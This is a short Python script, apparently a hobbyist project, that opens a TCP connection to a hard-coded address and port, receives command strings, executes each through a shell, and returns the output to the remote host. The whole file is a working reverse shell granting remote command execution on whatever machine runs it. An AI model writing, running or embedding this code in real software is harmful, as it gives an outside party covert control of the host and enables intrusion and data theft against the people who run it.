import socket
import subprocess



server = "192.168.1.76" #the server to communecate with
port = 1234 # the one we will go for

mysoc = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
mysoc.connect((server,port))

while True:
    command = mysoc.recv(1024).decode('utf-8') 

    # Execute the command
    output = subprocess.check_output(command, shell=True)

    # Convert the bytes to string
    output = output.decode("utf-8")

    mysoc.send(output.encode('utf-8'))

